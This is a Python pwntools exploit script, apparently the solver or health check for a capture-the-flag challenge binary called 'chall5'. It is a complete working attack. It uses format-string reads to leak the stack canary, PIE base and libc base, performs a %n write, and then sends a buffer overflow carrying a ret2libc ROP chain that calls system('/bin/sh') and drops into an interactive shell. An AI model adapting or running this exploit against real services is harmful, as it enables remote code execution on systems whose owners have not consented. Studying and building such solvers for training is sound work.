#!/usr/bin/env python3
from pwn import *
import sys

HOST  = ''
PORT  = 40005
NUM_ATTEMPTS = 10

target_elf = ELF('../bin/chall5')

if len(sys.argv) > 1:
	HOST = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

def exploit_attempt():
	try:
		if HOST:
			target_libc = ELF('../bin/libc.so.6')
			io = remote(HOST, PORT)
		else:
			target_libc = target_elf.libc
			io = target_elf.process(level='warn')

		# these will need to be altered depending on the libc version
		# 
		BASE  = target_elf.symbols['login'] + 15 # offset from leak to binary base (to overcome PIE)
		LIBC  = target_libc.get_section_by_name('.got.plt').header.sh_addr # offset from libc leak to libc base (to overcome ASLR)

		SYS   = target_libc.symbols['system'] #0x03cd10  # offset from libc base to system()
		BINSH = next(target_libc.search(b'/bin/sh')) # 0x17b8cf  # offset from libc base to /bin/sh
		EXIT  = target_libc.symbols['exit'] # 0x02ff70  # offset from libc base to exit()

		# lovely banner
		sys.stdout.write(io.recvuntil(':')[:-6])

		# step 1: leak the buffer and canary
		io.sendline(b'%p.%43$p')
		leak = io.recvline().strip().decode('ascii').split(' ', 1)[0].split('.')

		canary = int(leak[1], 16)
		strbuf = int(leak[0], 16)

		log.info('Canary: %#010x', canary)
		log.info('Buffer: %#010x', strbuf)

		# step 2: leak pie and libc
		io.recvuntil(b': ')
		io.sendline(b'%3$p.%5$p')
		leak = io.recvline().strip().decode('ascii').split(' ', 1)[0].split('.')

		libc =  int(leak[1], 16) - LIBC
		base =  int(leak[0], 16) - BASE

		log.info('Libc:   %#010x', libc)
		log.info('Base:   %#010x', base)

		# step 3: overwrite the format string with %s to do bof
		io.sendline(b'%29477c%7$n')
		io.recvuntil(b'incorrect\n').strip()

		# step 4: do a buffer overflow and win
		rop  = b'XXXX'
		rop += b'YYYY'          # ebx
		rop += b'ZZZZ'          # ebp
		rop += p32(libc+SYS)    # system()
		rop += p32(libc+EXIT)   # exit()
		rop += p32(libc+BINSH)  # /bin/sh

		# step 4: perform bof
		io.sendline(cyclic(128)+p32(canary)+rop)
		io.recvline()

		# step 5: enjoy the shell
		io.sendline(b'id')
		id_result = io.recvline()
		if b'uid=' in id_result:
			log.success('Shell: %s', id_result.decode('ascii').strip())
			if not os.environ.get('HEALTH_CHECK', False):
				io.interactive()
			return True
		else:
			log.failure('Error: %s', id_result)
	except EOFError as e:
		log.failure('Fail: EOF')
	except Exception as e:
		log.failure('Error: %s: %s', type(e), str(e))
	finally:
		io.close()
	return False

if __name__ == '__main__':
	for _ in range(NUM_ATTEMPTS):
		if exploit_attempt():
			sys.exit(0)
	sys.exit(1)